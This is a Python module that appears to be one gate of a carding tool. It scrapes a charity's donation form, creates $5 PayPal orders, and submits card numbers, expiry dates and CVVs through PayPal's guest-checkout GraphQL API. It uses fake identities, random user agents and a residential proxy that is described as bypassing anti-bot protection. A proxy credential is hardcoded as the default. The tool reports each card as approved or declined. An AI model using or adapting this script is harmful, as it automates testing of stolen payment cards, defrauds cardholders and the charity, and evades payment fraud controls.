"""
PayPal Payment Gateway Checker
Uses proven working PayPal Commerce GraphQL API approach
with hardcoded residential proxy for anti-bot bypass
"""

import requests
import json
import os
import re
from typing import Tuple
from user_agent import generate_user_agent
from faker import Faker
import time
from gates.utilities import http_request, REQUEST_TIMEOUT

# Residential proxy from environment variable
_proxy_url = os.environ.get('RESIDENTIAL_PROXY', 'http://user_pinta:1acNvmOToR6d-country-US-state-Colorado-city-Denver@residential.ip9.io:8000')
PAYPAL_PROXY = {
    'http': _proxy_url,
    'https': _proxy_url
}


def _get_form_data(us, session):
    """Extract form data (hash, form_id, prefix) from donation form page"""
    url = "https://www.brightercommunities.org/donate-form/"
    headers = {'User-Agent': us}
    
    try:
        response = session.get(url, headers=headers, timeout=20, proxies=PAYPAL_PROXY)
        if response.status_code != 200:
            return None, None, None
        
        hash_match = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)
        form_id_match = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)
        prefix_match = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)
        
        if hash_match and form_id_match and prefix_match:
            return hash_match[0], form_id_match[0], prefix_match[0]
        
        return None, None, None
    except Exception:
        return None, None, None


def _create_paypal_order(us, session, fake, hash_val, form_id, prefix):
    """Create PayPal order and get order ID for payment"""
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash_val,
        'give-amount': '5.00',
        'give_first': fake.first_name(),
        'give_last': fake.last_name(),
        'give_email': fake.email()
    }

    headers = {'User-Agent': us}
    
    try:
        response = session.post(url, data=payload, headers=headers, timeout=20, proxies=PAYPAL_PROXY)
        response.raise_for_status()
        
        data = response.json()
        order_id = data.get("data", {}).get("id")
        
        if order_id:
            return order_id
        return None
    except Exception:
        return None


def _get_card_type(card_num: str) -> str:
    """Determine card type from card number"""
    first_digit = card_num[0]
    first_two = card_num[:2]
    
    # Check for Amex (34xx or 37xx)
    if first_two in ['34', '37']:
        return 'AMERICAN_EXPRESS'
    
    # Standard card types
    card_types = {
        '3': 'AMERICAN_EXPRESS',  # Fixed: was JCB, should be AmEx
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }
    return card_types.get(first_digit, 'VISA')


def _submit_payment(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                    us: str, session, fake, order_id: str, card_type: str) -> str:
    """Submit payment with card details via PayPal GraphQL API"""
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
        "variables": {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": card_type,
                "expirationDate": f"{card_mon}/20{card_yer}",
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc,
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }

    headers = {'User-Agent': us, 'Content-Type': "application/json"}
    
    try:
        response = session.post(url, data=json.dumps(payload), headers=headers, timeout=20, proxies=PAYPAL_PROXY)
        time.sleep(0.5)  # Brief delay to avoid rate limiting
        return response.text
    except Exception:
        return ""


def _parse_paypal_response(response_text: str) -> str:
    """Parse PayPal GraphQL response and determine status"""
    if not response_text:
        return "DECLINED ❌ No response"
    
    # Check for successful charge indicators
    if "accessToken" in response_text or "cartId" in response_text:
        return "✅ APPROVED - Charged $5.00"
    
    # Check for specific error codes
    error_codes = {
        "INVALID_SECURITY_CODE": "DECLINED ❌ Invalid CVV",
        "GRAPHQL_VALIDATION_FAILED": "DECLINED ❌ Validation failed",
        "EXISTING_ACCOUNT_RESTRICTED": "DECLINED ❌ Account restricted",
        "RISK_DISALLOWED": "DECLINED ❌ Risk check failed",
        "ISSUER_DATA_NOT_FOUND": "DECLINED ❌ Card issuer error",
        "INVALID_BILLING_ADDRESS": "DECLINED ❌ Insufficient funds",
        "R_ERROR": "DECLINED ❌ Generic error",
        "ISSUER_DECLINE": "DECLINED ❌ Card declined",
        "EXPIRED_CARD": "DECLINED ❌ Expired card",
        "LOGIN_ERROR": "DECLINED ❌ Login error",
        "VALIDATION_ERROR": "DECLINED ❌ Validation error",
    }
    
    for error_code, message in error_codes.items():
        if error_code in response_text:
            return message
    
    # Default decline
    return "DECLINED ❌ Card declined"


def _test_with_paypal_graphql(card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> Tuple[str, bool]:
    """
    Test card using PayPal Commerce GraphQL API (proven working method)
    """
    try:
        # Setup session and faker
        us = generate_user_agent()
        session = requests.Session()
        fake = Faker()
        
        # Step 1: Get form data
        hash_val, form_id, prefix = _get_form_data(us, session)
        if not all([hash_val, form_id, prefix]):
            return ("DECLINED ❌ Form extraction failed", False)
        
        # Step 2: Create PayPal order
        order_id = _create_paypal_order(us, session, fake, hash_val, form_id, prefix)
        if not order_id:
            return ("DECLINED ❌ Order creation failed", False)
        
        # Step 3: Determine card type
        card_type = _get_card_type(card_num)
        
        # Step 4: Submit payment
        response_text = _submit_payment(card_num, card_mon, card_yer, card_cvc, us, session, fake, order_id, card_type)
        
        # Step 5: Parse response
        result = _parse_paypal_response(response_text)
        
        return (result, True)  # True indicates proxy was used
        
    except Exception as e:
        return (f"DECLINED ❌ {str(e)[:40]}", False)




def paypal_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str, proxy=None) -> Tuple[str, bool]:
    """
    Check card via PayPal Commerce GraphQL API
    
    Uses hardcoded residential proxy to bypass anti-bot protection.
    Proxy is only for PayPal (not Stripe or other gateways).
    
    Returns: (status_message, proxy_used)
    Format: "✅ APPROVED - Charged $5.00" or "DECLINED ❌ [reason]"
    """
    # Normalize year to 2-digit format if needed
    if len(card_yer) == 4:
        card_yer = card_yer[2:]
    
    # Use PayPal GraphQL method with hardcoded proxy
    result, proxy_ok = _test_with_paypal_graphql(card_num, card_mon, card_yer, card_cvc)
    
    return (result, proxy_ok)


def health_check() -> bool:
    """Quick health check for PayPal API connectivity"""
    try:
        # Check if PayPal GraphQL endpoint is reachable
        response = requests.get("https://www.paypal.com/graphql", timeout=5, proxies=PAYPAL_PROXY)
        # 400+ is fine as long as we get a response
        return response.status_code < 500
    except Exception:
        return False


